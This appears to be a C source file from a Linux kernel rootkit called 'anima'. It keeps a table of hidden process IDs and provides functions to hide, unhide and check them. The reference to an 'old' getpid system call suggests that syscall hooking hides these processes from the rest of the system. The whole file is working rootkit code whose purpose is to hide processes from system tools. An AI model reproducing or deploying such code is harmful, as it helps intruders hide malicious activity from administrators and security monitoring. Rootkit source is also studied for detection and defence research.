#include <linux/printk.h>

#include <anima/config.h>
#include <anima/ksyms.h>

static int hidden_pids[MAX_HIDDEN_PIDS] = {0};

int is_pid_hidden_no_getpid(pid_t pid)
{
	/* pid == 0 => calling process */
	if (!pid)
		goto not_hidden;

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
		if (hidden_pids[i] == pid)
			return 1;

not_hidden:
	return 0;
}

int is_pid_hidden(pid_t pid)
{
	/* let calling process access system calls if pid == getpid() */
	if (pid == ksyms.old_sys_getpid())
		return 0;
	return is_pid_hidden_no_getpid(pid);
}

void hide_pid(pid_t pid)
{
	pr_debug("%s: pid=%d\n", __func__, pid);

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (!hidden_pids[i] || hidden_pids[i] == pid) {
			hidden_pids[i] = pid;
			break;
		}
	}
}

void unhide_pid(pid_t pid)
{
	pr_debug("%s: pid=%d\n", __func__, pid);

	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = 0;
			break;
		}
	}
}

void hide_pid_debug(void)
{
	pr_debug("%s: hidden pids\n", __func__);
	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
		if (hidden_pids[i])
			pr_debug("\tpid=%d\n", hidden_pids[i]);
}
